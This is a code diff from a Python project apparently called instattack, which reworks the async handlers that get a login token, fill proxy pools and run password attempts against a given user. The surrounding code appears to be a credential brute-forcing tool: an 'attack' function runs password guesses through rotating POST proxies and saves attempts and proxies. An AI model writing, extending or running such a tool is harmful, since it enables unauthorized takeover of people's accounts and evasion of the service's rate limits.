@@ -1,7 +1,7 @@
 import asyncio
 
 from instattack.handlers import (
-    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)
+    ProxyHandler, TokenHandler, PasswordHandler)
 
 
 def get_handlers(request_config=None, proxy_config=None):
@@ -24,30 +24,27 @@ def get_handlers(request_config=None, proxy_config=None):
 
 
 def post_handlers(user, request_config=None, proxy_config=None):
+
     lock = asyncio.Lock()
+    start_event = asyncio.Event()
     auth_result_found = asyncio.Event()
-    results = asyncio.Queue()
 
     # We actually don't need to provide the lock to the password
     # and token handlers I think, since they don't access _pool directly.
-    results_handler = ResultsHandler(
-        user=user,
-        queue=results,
-        stop_event=auth_result_found
-    )
     proxy_handler = ProxyHandler(
         method='POST',
         lock=lock,
+        start_event=start_event,
         **proxy_config,
     )
     password_handler = PasswordHandler(
-        results,
         proxy_handler,
         user=user,
+        start_event=start_event,
         stop_event=auth_result_found,
         **request_config,
     )
-    return results_handler, proxy_handler, password_handler
+    return proxy_handler, password_handler
 
 
 async def get_token(loop, request_config=None, proxy_config=None):
@@ -70,7 +67,10 @@ async def get_token(loop, request_config=None, proxy_config=None):
     try:
         results = await asyncio.gather(
             token_handler.run(loop),
-            get_proxy_handler.run(loop, prepopulate=True),
+            # TEMPORARY LIMIT - Until things are better maintained with the size
+            # of the proxy pools, since it can make putting proxies in the queue
+            # slow.
+            get_proxy_handler.run(loop, prepopulate=True, prepopulate_limit=25),
         )
     except Exception as e:
         if not get_proxy_handler._stopped:
@@ -99,39 +99,45 @@ async def attack(loop, token, user, request_config=None, proxy_config=None, pwli
     Proxies will not be saved if it wasn't started, but that is probably
     desired behavior.
     """
-    results_handler, post_proxy_handler, password_handler = post_handlers(
+    post_proxy_handler, password_handler = post_handlers(
         user,
         request_config=request_config,
         proxy_config=proxy_config,
     )
     try:
         results = await asyncio.gather(
-            results_handler.run(loop),
             password_handler.run(loop, token, password_limit=pwlimit),
-            post_proxy_handler.run(loop, prepopulate=True),
+            # TEMPORARY LIMIT - Until things are better maintained with the size
+            # of the proxy pools, since it can make putting proxies in the queue
+            # slow.
+            post_proxy_handler.run(loop, prepopulate=True, prepopulate_limit=200),
         )
 
     except Exception as e:
         if not post_proxy_handler._stopped:
             await post_proxy_handler.stop(loop)
 
-        await password_handler.stop(loop)
+        # We might need a stop method for the password handler still just in case
+        # an exception is raised.
+        # await password_handler.stop(loop)
 
-        # Save Attempts Up Until This Point
-        await results_handler.save(loop)
-
+        # Save Attempts Up Until This Point & Save Proxies
         # Do we really want to save POST proxies on exceptions?
+        await password_handler.save(loop)
         await post_proxy_handler.save(loop)
 
         loop.call_exception_handler({'exception': e})
 
     else:
-        # Proxy handler should not be stopped by this point.
+        # Proxy Handler Should be Stopped?
         await post_proxy_handler.stop(loop)
-        await password_handler.stop(loop)
 
-        # Save Attempts Up Until This Point
-        await results_handler.save(loop)
+        # We might need a stop method for the password handler still just in case
+        # an exception is raised.
+        # await password_handler.stop(loop)
+
+        # Save Attempts Up Until This Point & Save Proxies
+        await password_handler.save(loop)
         await post_proxy_handler.save(loop)
 
         return results[0]
